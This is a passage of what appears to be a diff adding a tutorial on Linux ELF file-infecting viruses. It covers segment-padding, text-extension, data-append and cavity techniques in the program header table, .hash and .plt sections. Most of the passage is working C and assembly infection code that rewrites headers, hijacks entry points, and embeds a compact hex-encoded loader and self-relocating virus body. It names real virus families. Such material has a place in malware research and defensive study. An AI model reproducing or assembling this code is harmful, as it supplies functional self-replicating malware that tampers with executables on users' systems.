+     * p_type - PT_LOAD (loadable segment)
+     * p_offset - offset of virus in the file
+     * p_vaddr, p_paddr - virus address in memory (co-aligned with offset)
+     * p_filesz, p_memsz - virus size
+     * p_flags - PF_R | PF_X
+     * p_align - 4096
+
+   I will adapt Mover's code.
+        ...
+asm(    ".globl fake_host; fake_host: mov $1, %eax; int $0x80");
+asm(    ".globl virus_start; virus_start:\n"
+        "pusha; call virus; popa; .byte 0xe9; .long fake_host - . - 4");
+
+...
+void virus(void)
+{
+        /* determine our own size and location in memory, init globals */
+        globals glob;
+        g = &glob;
+        g->size = (uint32_t)&virus_end - (uint32_t)&virus_start;
+        g->self = (void*)__builtin_return_address(0) - 6;
+        /* do our job */
+        search(NULL);
+}
+/* examples/Segments/infect-replace.c */
+        /* find PT_NOTE and min addr */
+        Elf32_Phdr *p;
+        uint32_t base;
+        phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
+        for (base = 0, p = NULL, i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_NOTE) {
+                        p = &phdr[i];
+//                      break;
+                } else
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0)
+                        base = phdr[i].p_vaddr;
+        if (p == NULL)
+                goto _unmap;
+        /* turn PT_NOTE into PT_LOAD */
+        p->p_type = PT_LOAD;
+        p->p_flags = PF_R|PF_X;
+        p->p_align = 0x1000;
+        p->p_offset = l;
+        p->p_filesz = p->p_memsz = g->size;
+        p->p_vaddr = p->p_paddr = base - (2*PAGE_SIZE) + (l & (PAGE_SIZE -
+ 1));
+        if (write(h, g->self, g->size) != g->size)
+                goto _unmap;
+        uint32_t jmp = old_entry - p->p_vaddr - 12;
+        pwrite(h, &jmp, 4, l + 8, 0);
+        ehdr->e_entry = p->p_vaddr;
+
+   It will look as follows:
+File            Memory
+                +------+
+                |VIRUS |
++------+        +------+
+| CODE |        | CODE |
++------+        +------+
+| DATA |        | DATA |
++------+        +------+
+:      :
+:      :
++------+
+|VIRUS |
++------+
+
+   In memory the virus is located one page below text segment. Other
+   possibility is to map the new segment at the fixed address, that will
+   even further simplify the code.
+Before
+Entry point 0x8049db0
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+  LOAD           0x000000 0x08048000 0x08048000 0x13b5a 0x13b5a R E 0x1000
+  LOAD           0x014000 0x0805c000 0x0805c000 0x00820 0x00bd0 RW  0x1000
+  DYNAMIC        0x014440 0x0805c440 0x0805c440 0x000e0 0x000e0 RW  0x4
+  NOTE           0x000148 0x08048148 0x08048148 0x00020 0x00020 R   0x4
+  GNU_EH_FRAME   0x0134f8 0x0805b4f8 0x0805b4f8 0x0002c 0x0002c R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+After
+Entry point 0x804738c
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+  LOAD           0x000000 0x08048000 0x08048000 0x13b5a 0x13b5a R E 0x1000
+  LOAD           0x014000 0x0805c000 0x0805c000 0x00820 0x00bd0 RW  0x1000
+  DYNAMIC        0x014440 0x0805c440 0x0805c440 0x000e0 0x000e0 RW  0x4
+  LOAD           0x01538c 0x0804738c 0x0804738c 0x0030e 0x0030e R E 0x1000
+  GNU_EH_FRAME   0x0134f8 0x0805b4f8 0x0805b4f8 0x0002c 0x0002c R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+
+  Extending the text segment "down"
+
+   We could not move the text segment (it contains the absolute addresses)
+   or extend it "up" (the data segment begins right after the code), but
+   we could extend it "down".
+Memory Before                        After
+8047000                        +-----------+
+                               | EHDR      |
+8048000 +-----------+ - - - - -| PHDR  - - | - -
+        | ELF       | entry -> | virus     |
+        | PHT       |          |           |
+        | .interp   | _ _ _ _ _| .interp   | _ _
+        :           :          :           :
+        |           |          |           |
+entry ->| .text     |          | .text     |
+        |           |          |           |
+        +-----------+          +-----------+
+        |           |          |           |
+        | .data     |          | .data     |
+        |           |          |           |
+        +-----------+          +-----------+
+
+   I will use the same code and change the infect() routine:
+/* examples/Segments/infect-textdown.c */
+        /* FreeBSD assumes that ELF Header, PHDR and INTERP fit in first p
+age */
+        /* see /sys/kern/imgact_elf.c for details */
+        uint32_t t = 0;
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_INTERP) {
+                        t = phdr[i].p_offset + phdr[i].p_filesz;
+                        break;
+                }
+        /* no INTERP, put the virus right after PHDR */
+        if (t == 0)
+                t = ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr);
+
+        /* do we have enough space? */
+        if ((PAGE_SIZE - t) < g->size)
+                goto _unmap;
+        /* copy virus body */
+        MAKE_HOLE(0, PAGE_SIZE);
+        memcpy(m + t, g->self, g->size);
+        bzero(m + t + g->size, PAGE_SIZE - g->size);
+        /* adjust headers */
+        SHIFT_SHDRS(0, PAGE_SIZE);
+        for (i = 0; i < ehdr->e_phnum; i++) {
+                /* extend text segment downwards */
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
+                        phdr[i].p_vaddr -= PAGE_SIZE;
+                        phdr[i].p_paddr -= PAGE_SIZE;
+                        phdr[i].p_filesz+= PAGE_SIZE;
+                        phdr[i].p_memsz += PAGE_SIZE;
+                        /* change entry point */
+                        *(uint32_t*)(m + t + 8) = old_entry - phdr[i].p_va
+ddr - t - 12;
+                        ehdr->e_entry = phdr[i].p_vaddr + t;
+                } else  /* leave these segments in the beginning... */
+                if (phdr[i].p_type == PT_PHDR || phdr[i].p_type == PT_INTE
+RP) {
+                        phdr[i].p_vaddr -= PAGE_SIZE;
+                        phdr[i].p_paddr -= PAGE_SIZE;
+                } else  /* shift the others */
+                        phdr[i].p_offset+= PAGE_SIZE;
+        }
+
+  Extending the data segment
+
+    Initializing the .bss
+
+             Before                                 After
+        file            memory          file and memory
+        +-----------+  +-----------+    +-----------+
+        |           |  |           |    |           |
+        | .text     |  | .text     |    | .text     |
+        +-----------+  +-----------+    +-----------+
+        | .data     |  | .data     |    | .data     |
+        |           |  |           |    |           |
+        +-----------+  |- - - - - -|    |- - - - - -|
+        p_memsz >      | .bss      |    | .bss 00000| p_memsz =
+          p_filesz     +-----------+    |- - - - - -|   p_filesz
+                                        | virus     |
+                                        +-----------+
+
+/* examples/Segments/infect-bssend.c */
+        uint32_t t, u;
+        Elf32_Phdr *p = NULL;
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset) {
+                        p = &phdr[i];
+                        break;
+                }
+        if (p == NULL)
+                goto _unmap;
+
+        t = p->p_offset + p->p_filesz;
+        u = p->p_memsz - p->p_filesz + g->size;
+        MAKE_HOLE(t, u);
+        bzero(m + t, u);
+
+        SHIFT_SHDRS(t, u);
+
+        /* write virus body */
+        memcpy(m + p->p_offset + p->p_memsz, g->self, g->size);
+        t = p->p_vaddr + p->p_memsz;
+        *(uint32_t*)(m + p->p_offset + p->p_memsz + 8) = old_entry - t - 1
+2;
+        p->p_flags |= PF_X;
+        p->p_filesz += u;
+        p->p_memsz = p->p_filesz;
+        ehdr->e_entry = t;
+
+    End of data segment
+
+             Before                                 After
+        file            memory          file            memory
+        +-----------+  +-----------+    +-----------+   +-----------+
+        |           |  |           |    |           |   |           |
+        | .text     |  | .text     |    | .text     |   | .text     |
+        +-----------+  +-----------+    +-----------+   +-----------+
+        | .data     |  | .data     |    | .data     |   | .data     |
+        |           |  |           |    |           |   |           |
+        +-----------+  |- - - - - -|    |           |   |           |
+                       |           |    | Virus     |   | Virus     |
+                       | .bss      |    +-----------+   |- - - - - -|
+                       |           |                    | .bss      |
+                       +-----------+                    +-----------+
+/* examples/Segments/infect-dataend.c */
+        Elf32_Phdr *p = NULL;
+        uint32_t t, u;
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD && (p == NULL || phdr[i].p_v
+addr > p->p_vaddr))
+                        p = &phdr[i];
+        if (p == NULL)
+                goto _unmap;
+
+        t = p->p_offset + p->p_filesz;
+        u = p->p_vaddr + p->p_filesz;
+        MAKE_HOLE(t, g->size);
+        memcpy(m + t, g->self, g->size);
+
+        p->p_filesz += g->size;
+        if (p->p_memsz < p->p_filesz)
+                p->p_memsz = p->p_filesz;
+        p->p_flags |= PF_X | PF_R;
+        p->p_align = 0x1000;
+
+        SHIFT_SHDRS(t, g->size);
+
+        *(uint32_t*)(m + t + 8) = old_entry - u - 12;
+        ehdr->e_entry = u;
+#define CLEAN_ITSELF
+
+   Virus writes itself to the area which holds the unitialized data.
+   Surprize! An infected programs working incorectly. What's happened?
+   Let's infect the following program:
+/* examples/Segments/victim.c */
+#include <stdio.h>
+int test[16];
+
+int main(int argc, char **argv)
+{
+        int i;
+        for (i = 0; i < 16; i++)
+                printf("%x ", test[i]);
+        putchar('\n');
+        return 0;
+}
+
+   It must print zeroes:
+./victim
+0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+
+   After infection?
+./victim
+246c8b38 8980cd3c 611c2444 535657c3 ...
+
+   Looks similar, right? It's our own code! To give the program its zeroes
+   promissed by C99, the virus must clean the memory where it resides. The
+   common trick to do so (used by T. Duff twenty years ago) is to place
+   the clean routine to stack, but since the stack is not executable
+   anymore and it's a headache to fix that, let's use the code from the
+   previous chapter (Mover again):
+/* examples/Segments/virus_clean_itself.c */
+#ifdef  CLEAN_ITSELF
+        /* move itself to the new memory location */
+        uint32_t nloc;
+        nloc = mmap(NULL, g->size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_A
+NONYMOUS, 0, 0);
+        if (nloc > 0xfffff000)
+                exit(0);
+        memcpy((void*)nloc, g->self, g->size);
+/*1*/   *(uint32_t*)(nloc + 8) -= nloc - (uint32_t)g->self;
+        mprotect(nloc, g->size, PROT_READ|PROT_EXEC);
+        asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r
+"(nloc):"%eax");
+
+/*2*/   bzero(g->self, g->size);
+
+        *(uint32_t*)(&esp - 1) = (nloc + 6);
+#endif
+
+   With some changes:
+    1. Argument of the jmp insruction which return the control to the host
+       program  - is a relative address. When the virus will move to
+       another   memory  location  it  should  be  fixed  (substract
+       delta-offset).
+Before        After
+| host       |<--+  | host       |<==+   ---
+:            :   |  :            :   #    ^
+:            :   |  :            :   #    |
+| pusha      |   |  | 0          | - - - -|- - - - - g->self
+| call virus |   |  | 0 0 0 0 0  |   #    |     ^
+| popa       |   |  | 0          |   #    |     |
+| jmp host   |---+  | 0 0 0 0 0  |   #    |     |
+: .......... :      :            :   #    v     | delta
+                    :   wrong!   :<--+   ---    |
+                    :            :   |          |
+                    :            :   |          v
+                    | pusha      |   | - - - - - - - nloc
+                    | call virus |   |
+                    | popa       |   |
+                    | jmp host   |---+
+                    | .........  |
+    2. The virus must clear the memory
+
+   Now infected program works as intended.
+
+  Fall into the Gap
+
+   I already mentioned the hole that appears between segments in the
+   process due to alignment requirements:
+                    ,------------- 8048000 --- text segment
+                   / ccccccccccccc page
+                  /  ------------- 8049000
+| text segment  |/   ccccccDDDDDDD page
+| ccccccccccccc | ,--------------- 804a000 --- data segment
+| ccccccDDDDDDD |X   ccccccDDDDDDD page
+| DDDDDDDDDDDDD | `--------------- 804b000
+| data segment  |\   DDDDDDDDDDDDD page
+                  `---------------
+
+   The data segment begins right after the text seg. in the file, but in
+   the memory code end data can not share the same page, since the code
+   has r-x permissions and data rw-. As seen from the picture the same
+   page is mmaped twice and the hole (page-size long) appears between the
+   segments. It's more than enough for the virus code.
+
+   Is it possible to avoid this? Yes, it is, but to do that the linker
+   should pad the text segment up to the page size _in the file_:
+   text segment
+|               |
+| - - - - - - - |
+| ccccccccccccc | page
+| - - - - - - - |
+| cccccc0000000 | page
++---------------+
+| DDDDDDDDDDDDD | page
+| - - - - - - - |
+|               |
+  data segment
+
+   The file size will grow and there still be an unused space in the end
+   of text segment, less than a page, but enough for the virus. The ratio
+   of two types of files in my system is 2:1.
+/* examples/Segments/infect-padding.c */
+        uint32_t dp, tp, ve, vo;
+        /* find loadable segments and check 'em */
+        phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0 &&
+                   (i + 1) < ehdr->e_phnum && phdr[i + 1].p_type == PT_LOA
+D) {
+                        if (phdr[i].p_filesz != phdr[i].p_memsz)
+                                break;
+                        goto ok;
+                }
+        goto _unmap;
+ok:     vo = phdr[i].p_filesz;
+        ve = phdr[i].p_vaddr + phdr[i].p_filesz;
+        tp = 4096 - (phdr[i].p_filesz & 4095);
+        dp = phdr[i + 1].p_vaddr - (phdr[i + 1].p_vaddr & ~4095);
+        if (tp + dp < g->size || tp == 0x1000 || phdr[i + 1].p_filesz == 0
+)
+                goto _unmap;
+
+        /* update program headers */
+        phdr[i].p_memsz += tp;
+        phdr[i].p_filesz += tp;
+        if (dp != 0) {
+                /* adjust data seg */
+                phdr[i + 1].p_vaddr -= dp;
+                phdr[i + 1].p_paddr -= dp;
+                phdr[i + 1].p_offset += tp;
+                phdr[i + 1].p_filesz += dp;
+                phdr[i + 1].p_memsz += dp;
+
+                /* adjust PHDRs */
+                for (i = i + 2; i < ehdr->e_phnum; i++)
+                        if (phdr[i].p_offset >= vo)
+                                phdr[i].p_offset += tp + dp;
+
+                /* make hole */
+                MAKE_HOLE(vo, tp + dp);
+
+                /* adjust SHDRs */
+                SHIFT_SHDRS(vo, tp + dp);
+        }
+        memcpy(m + vo, g->self, g->size);
+
+        *(uint32_t*)(m + vo + 8) = old_entry - ve - 12;
+        ehdr->e_entry = ve;
+
+   For the first type of files the virus will add one more page, moving
+   the text segment's boundary "up" and data segment's boundary down,
+   increasing the size of both segments. For the second type of files the
+   virus will just write its body over the padding of text segment.
+
+   The virtual addresses of both segments are left unchanged.
+
+   Examples of headers:
+    1.
+        +---------------+  +---------------+
+        | CCCCCCCCCCCCC |  | CCCCCCCCCCCCC |
+        | CCCCCC +------+  | CCCCCC   VVVV |
+        +--------+ DDDD |  +---------------+
+        | DDDDDDDDDDDDD |  | VVVVVVV  DDDD |
+        +---------------+  | DDDDDDDDDDDDD |
+                           +---------------+
+Before
+   LOAD           0x000000 0x08048000 0x08048000 0x032b8 0x032b8 R E 0x100
+0
+   LOAD           0x0032b8 0x0804c2b8 0x0804c2b8 0x00662 0x00662 RW  0x100
+0
+After
+   LOAD           0x000000 0x08048000 0x08048000 0x04000 0x04000 R E 0x100
+0
+   LOAD           0x004000 0x0804c000 0x0804c000 0x0091a 0x0091a RW  0x100
+0
+    2.
+        +---------------+  +---------------+
+        | CCCCCCCCCCCCC |  | CCCCCCCCCCCCC |
+        | CCCCCC 000000 |  | CCCCCC VVVVVV |
+        +---------------+  +---------------+
+        | DDDDDDDDDDDDD |  | DDDDDDDDDDDDD |
+        +---------------+  +---------------+
+Before
+  LOAD           0x000000 0x08048000 0x08048000 0x13b5a 0x13b5a R E 0x1000
+  LOAD           0x014000 0x0805c000 0x0805c000 0x00820 0x00bd0 RW  0x1000
+After
+  LOAD           0x000000 0x08048000 0x08048000 0x14000 0x14000 R E 0x1000
+  LOAD           0x014000 0x0805c000 0x0805c000 0x00820 0x00bd0 RW  0x1000
+
+   This method is used in the Coin virus.
+
+  Merging the segments
+
+   [FIXME]
+
+Cavity infectors
+
+   In  the previous chapter I showed how to explore the gaps between
+   segments, let's find some space _within_ the segments. There are a lot
+   of optional headers, padding, "meaningless" instructions, reserved
+   fields, dead code and zero variables within loadable segments. All that
+   could and would be used to place a viral code. Most of this areas are
+   small, so all examples from this chapter would write not the virus body
+   as a whole, but virus loader only. The loader will read the virus body
+   from  the  file's tail and pass it the control, however there are
+   sometimes enough space for the complete virus code.
+
+  The Loader
+
+   The loader is quite simple, been it written in C it would took one line
+   of code:
+jmp(mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, open(argv[0],
+ O_RDONLY), offset);
+
+   But this is the rare case when using assembly is justified and merely
+   unavoidable - every byte is counts. I managed with 31 bytes:
+/* examples/Loader/loader.asm */
+        BITS    32
+        pusha                   ;1
+        push    byte 5
+        pop     eax
+        xor     ecx, ecx
+        mov     ebx,[esp + 0x24];4 ebx = argv[0]
+        int     0x80            ;2 open(argv[0], O_RDONLY)
+        push    dword 0x0       ;5 offset for mmap
+        push    eax             ;1 handle
+        inc     ecx             ;1 ecx = 1
+        push    ecx             ;1 MAP_SHARED
+        push    byte 5          ;2 PROT_EXEC
+        push    ecx             ;1 length=1, but at least 1 page will be m
+maped
+        push    ebp
+        mov     ebx,esp         ;2 syscall args
+        mov     al,0x5a         ;2 __NR_old_mmap
+        int     0x80            ;2 mmap(0,1,PROT_EXEC,MAP_SHARED,h,o)
+        jmp     eax             ;2
+
+   The loader assumes that ebp and ecx contains zeroes upon program start:
+$ gdb /bin/arch
+(gdb) break *0x08048330
+Breakpoint 1 at 0x8048330
+(gdb) run
+Starting program: /bin/arch
+Breakpoint 1, 0x08048330 in ?? ()
+(gdb) info reg
+eax            0x113f64 1130340
+ecx            0x0      0
+edx            0x10d990 1104272
+ebx            0x116fb4 1142708
+esp            0xbfaada40       0xbfaada40
+ebp            0x0      0x0
+esi            0xbfaada4c       -1079322036
+edi            0x8048330        134513456
+eip            0x8048330        0x8048330
+eflags         0x282    642
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+   This allowed me to save three bytes. It is possible to replace push
+   byte 4 with push ecx (PROT_READ), if you have Read you'll have the
+   eXecute  too,  but  with  this  change  the loader will fail with
+   "kernel.exec-shield" enabled. The "length" arg is set to 1, but that's
+   right - the whole page will be mmaped anyway.
+
+   There is no space left for the error checking and cleaning the stack
+   from the mmap' arguments, so the virus prologue must be changed:
+asm(    ".globl virus_start; virus_start:\n"
+        "call virus; add $24,%esp; popa; .byte 0x68; old_entry: .long fake
+_host; ret");
+
+  Program Header Table and .note.ABI-tag
+
+   We already exploited unused PHT entries in the previous chapter. Why
+   not to write the code there? The virus will find unused entries in the
+   PHT, move the table entries, reduce the number of records (e_phnum),
+   write the code to the end of table. More than this, the PT_NOTE record
+   points to the .note.ABI-tag section (which will become unused after
+   removal of corresponding PHT entry), so this section could be used as
+   well.
+
+   Every record in the table is 32 bytes long, .note.ABI-tag section has
+   the same length, the code below will randomly choose the place for the
+   loader by removing one record fom the PHT. The virus may remove all
+   unused records thus relaxing the requirements to the loader's size.
+/* examples/Cavity.PHT/infect-pht.c */
+        /* find start (to calculate new entry) and end (to check whether w
+e can
+        remove PT_PHDR) of text segment */
+        uint32_t b = 0, t = 0, o;
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
+                        b = phdr[i].p_vaddr;
+                        t = phdr[i].p_vaddr + phdr[i].p_filesz;
+                }
+        if (b == 0)
+                goto _unmap;
+        /* do we have "unused" entries in PHT */
+        char targets[3];
+        int nt = 0;
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_NOTE ||
+                /* PT_PHDR cannot be removed if it is located outside load
+able segment */
+                /* FIXME: only text segment checked here */
+                (phdr[i].p_type == PT_PHDR && phdr[i].p_vaddr >= b && phdr
+[i].p_vaddr < t) ||
+                /* we cannot remove GNU_STACK if the stck ought to be exec
+utable */
+                (phdr[i].p_type == PT_GNU_STACK && (phdr[i].p_flags & PF_X
+) == 0))
+                        targets[nt++] = i;
+        if (nt == 0)
+                goto _unmap;
+        i = targets[random(nt)];
+        t = phdr[i].p_type;
+        o = phdr[i].p_offset;
+        /* remove selected PHT entry */
+        if (i != ehdr->e_phnum - 1)
+                memcpy(&phdr[i], &phdr[i + 1], sizeof(Elf32_Phdr) * (ehdr-
+>e_phnum - i - 1));
+        ehdr->e_phnum--;
+        /* patch loader */
+        uint32_t nl = (l + 4095) & 0xfffff000;
+        *(uint32_t*)(g->loader + PATCH_OFFSET) = nl;
+        /* PT_NOTE points to section that can be removed */
+        if (t == PT_NOTE && random(2) == 0) {
+                /* replace .note.ABI-tag section */
+                memcpy(m + o, g->loader, CSIZE);
+        } else {
+                /* replace PHT entry */
+                o = ((char*)&phdr[ehdr->e_phnum] - (char*)m);
+                memcpy(m + o, g->loader, CSIZE);
+
+        }
+        /* write virus body */
+        ftruncate(h, nl);
+        lseek(h, 0, 2);
+        write(h, g->self, g->size);
+        pwrite(h, &ehdr->e_entry, 4, nl + 10, 0);
+
+        /* update entry point */
+        ehdr->e_entry = b + o;
+
+   Before writing the virus body the file must be rounded to the page
+   size.
+
+   The code has been slightly changed, virus() function has been extended
+   with initialization of loader and random number generator:
+        /* init random() */
+        g->seed = time(0);
+
+        /* loader */
+        uint8_t loader[CSIZE];
+        *(uint32_t*)(loader + 0x00) = 0x5c8b9560;
+        *(uint32_t*)(loader + 0x04) = 0x05b02424;
+        *(uint32_t*)(loader + 0x08) = 0x006880cd;
+        *(uint32_t*)(loader + 0x0c) = 0x50000000;
+        *(uint32_t*)(loader + 0x10) = 0x046a5141;
+        *(uint32_t*)(loader + 0x14) = 0x89514951;
+        *(uint32_t*)(loader + 0x18) = 0xcd5ab0e3;
+        *(uint32_t*)(loader + 0x1c) = 0x00e0ff80;
+        g->loader = loader;
+
+   Upon infection the file looks as follows:
+Before                              After                           Anothe
+r variant
+:              :                :              :                :         
+     :
+|              |   ELF header   |              |                |         
+     |
++--------------+                +--------------+                +---------
+-----+
+| PHDR         | Program Header | PHDR         |                | PHDR    
+     |
+| INTERP       |     Table      | INTERP       |                | INTERP  
+     |
+| LOAD         |                | LOAD         |                | LOAD    
+     |
+| LOAD         |                | LOAD         |                | LOAD    
+     |
+| DYNAMIC      |                | DYNAMIC      |                | DYNAMIC 
+     |
+| NOTE         |                | NOTE         |                | EH_FRAME
+     |
+| EH_FRAME     |                | EH_FRAME     |                | STACK   
+     |
+| STACK        | Entry Point -> | virus loader |                |         
+     |
++--------------+                +--------------+                +---------
+-----+
+| .interp      |                | .interp      |                | .interp 
+     |
++--------------+                +--------------+                +---------
+-----+
+| .note.ABI-tag|                | .note.ABI-tag| Entry Point -> | virus lo
+ader |
++--------------+                +--------------+                +---------
+-----+
+:              :                :              :                :         
+     :
+
+  Hash
+
+   The .hash section is used to speed up the symbol resolving. It is
+   possible to remove it completely or decrease its size.
+
+   To remove the .hash:
+     * Find  it in the section table (sh_type == SHT_HASH), find the
+       .dynamic at the same time
+     * Check is it large enough to hold our code
+     * Remove the record tagged DT_HASH from .dynamic
+     * Copy the code to the .hash section (at sh_offset)
+     * Change section type to SHT_NULL, SHT_PROGBITS or whatever you want,
+       anything rather than SHT_HASH
+
+/* examples/Casher/infect-remove.c */
+        int dsz = 0;
+        Elf32_Dyn *dyn;
+        Elf32_Shdr *sh;
+
+        /* save pointer to the .hash entry in the SHT and get dynamic */
+        sh = NULL; dyn = NULL;
+        for (i = 0; i < ehdr->e_shnum; i++) {
+                if (shdr[i].sh_type == SHT_HASH)
+                        sh = &shdr[i];
+                /* optional */
+                if (shdr[i].sh_type == SHT_DYNAMIC) {
+                        dsz = shdr[i].sh_size / sizeof(Elf32_Dyn);
+                        dyn = (Elf32_Dyn*)(m + shdr[i].sh_offset);
+
+                }
+        }
+        if (sh == NULL)
+                goto _unmap;
+
+        /* do we have enough space? */
+        if (sh->sh_size < (CSIZE + 12))
+                goto _unmap;
+
+        /* remove DT_HASH from dynamic section (optional) */
+        if (dyn != NULL)
+                for (i = 0; i < dsz; i++)
+                        if (dyn[i].d_tag == DT_HASH) {
+                                memmove(&dyn[i], &dyn[i+1], (dsz - i - 2) 
+* sizeof(Elf32_Dyn));
+                                break;
+                        }
+
+        /* patch loader */
+        uint32_t nl = (l + 4095) & 0xfffff000;
+        *(uint32_t*)(g->loader + PATCH_OFFSET) = nl;
+
+        *(uint32_t*)(m + sh->sh_offset) = 1;
+        *(uint64_t*)(m + sh->sh_offset + 8) = 0;
+        /* copy our code */
+        memcpy(m + sh->sh_offset + 12, g->loader, CSIZE);
+
+        /* change .hash' type */
+        sh->sh_type = SHT_PROGBITS;
+
+        /* write virus body */
+        ftruncate(h, nl);
+        lseek(h, 0, 2);
+        write(h, g->self, g->size);
+        pwrite(h, &ehdr->e_entry, 4, nl + 10, 0);
+
+        /* change entry point */
+        ehdr->e_entry = sh->sh_addr + 12;
+/* examples/Casher/infect-reduce.c */
+        unsigned long elf_hash(const unsigned char *name) {
+                unsigned long h = 0, g;
+                while (*name) {
+                        h = (h << 4) + *name++;
+                        if (g = h & 0xf0000000)
+                                h ^= g >> 24;
+                        h &= ~g;
+                }
+                return h;
+        }
+        void build_hash(uint32_t *hash, int nbuckets, int nchains, Elf32_S
+ym *sym, char *str) {
+                uint32_t i, h, *buckets, *chains;
+                buckets = hash + 2;
+                chains  = buckets + nbuckets;
+                hash[0] = nbuckets;
+                hash[1] = nchains;
+                for (i = 1; i < nchains; i++) {
+                        h = elf_hash(str + sym[i].st_name) % nbuckets;
+                        if (buckets[h] == 0)
+                                buckets[h] = i;
+                        else {
+                                h = buckets[h];
+                                while (chains[h] != 0)
+                                        h = chains[h];
+                                chains[h] = i;
+                        }
+                }
+        }
+        Elf32_Sym *sym = NULL;
+        Elf32_Shdr *sh = NULL;
+        char *str = NULL;
+
+        /* find .hash section */
+        for (i = 0; i < ehdr->e_shnum; i++)
+                if (shdr[i].sh_type == SHT_HASH) {
+                        sh = &shdr[i];
+                        break;
+                }
+        if (sh == NULL)
+                goto _unmap;
+
+        /* find symbol table and strings */
+        i = sh->sh_link;
+        sym = (Elf32_Sym*)(m + shdr[i].sh_offset);
+        i = shdr[i].sh_link;
+        str = (char*)(m + shdr[i].sh_offset);
+
+        /* rebuild hash */
+        uint32_t *hash = (uint32_t*)(m + sh->sh_offset), nb = hash[0], nc 
+= hash[1];
+        if (((int)nb - (CSIZE + 3) / 4) < 1)
+                goto _unmap;
+        bzero(m + sh->sh_offset, (nb + nc + 2) * 4);
+        nb -= (CSIZE + 3) / 4;
+        build_hash(hash, nb, nc, sym, str);
+
+        /* patch loader */
+        uint32_t nl = (l + 4095) & 0xfffff000;
+        *(uint32_t*)(g->loader + PATCH_OFFSET) = nl;
+
+        /* write loader */
+        i = (2 + nb + nc) * 4;
+        memcpy(m + sh->sh_offset + i, g->loader, CSIZE);
+
+        /* write virus body */
+        ftruncate(h, nl);
+        lseek(h, 0, 2);
+        write(h, g->self, g->size);
+        pwrite(h, &ehdr->e_entry, 4, nl + 10, 0);
+
+        /* update entry point */
+        ehdr->e_entry = sh->sh_addr + i;
+
+   This method is used in the Linux.Hasher.A-D
+
+  Procedure Linkage Table
+
+/* examples/PuLpiT/infect-plt.c */
+        /* find .plt section (by name) */
+        uint32_t psz, pla;
+        uint8_t *plt = NULL;
+        if (ehdr->e_shstrndx == SHN_UNDEF)
+                goto _unmap;
+        char *strtab = m + shdr[ehdr->e_shstrndx].sh_offset;
+        for (i = 0; i < ehdr->e_shnum; i++)
+                if (*(uint32_t*)(strtab + shdr[i].sh_name) == 0x746c702e) 
+{
+                        plt = shdr[i].sh_offset + m;
+                        pla = shdr[i].sh_addr;
+                        psz = shdr[i].sh_size;
+                        break;
+                }
+        if (plt == NULL || CSIZE > (psz - 16))
+                goto _unmap;
+
+        /* check values in .plt */
+        uint32_t gotp, orel, first_got, first_rel;
+        gotp = orel = 0;
+        for (i = 16; i < psz; i += 16) {
+                if (gotp != 0) {
+                        if (*(uint32_t*)(plt + i + 2) - gotp != 4)
+                                goto _unmap;
+                        if (*(uint32_t*)(plt + i + 7) - orel != 8)
+                                goto _unmap;
+                }
+                gotp = *(uint32_t*)(plt + i + 2);
+                orel = *(uint32_t*)(plt + i + 7);
+                if (i == 16) {
+                        first_got = gotp;
+                        first_rel = orel;
+                }
+        }
+
+        /* patch loader */
+        uint32_t nl = (l + 4095) & 0xfffff000;
+        *(uint32_t*)(g->loader + PATCH_OFFSET) = nl;
+
+        /* write loader */
+        memcpy(plt + 16, g->loader, CSIZE);
+
+        /* write virus body */
+        ftruncate(h, nl);
+        lseek(h, 0, 2);
+        write(h, g->self, g->size);
+        pwrite(h, &ehdr->e_entry, 4, nl + 10, 0);
+
+        /* write number of entries in .plt */
+        write(h, &pla, 4);
+        write(h, &psz, 4);
+        write(h, &first_got, 4);
+        write(h, &first_rel, 4);
+
+        /* update entry point */
+        ehdr->e_entry = pla + 16;
+/* examples/PuLpiT/restore-plt.c */
+        /* move itself to the new memory location */
+        uint32_t nloc;
+        nloc = mmap(NULL, 1, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMO
+US, 0, 0);
+        memcpy((void*)nloc, g->self, g->size + 12);
+        mprotect(nloc, g->size, PROT_READ|PROT_EXEC);
+        asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r
+"(nloc):"%eax");
+
+        /* restore .plt section */
+        uint32_t plta, plts, gotp, orel, jmp1, i;
+        plta = *(uint32_t*)(g->self + g->size + 0);
+        plts = *(uint32_t*)(g->self + g->size + 4);
+        gotp = *(uint32_t*)(g->self + g->size + 8);
+        orel = *(uint32_t*)(g->self + g->size + 12);
+        jmp1 = 0xffffffe0;
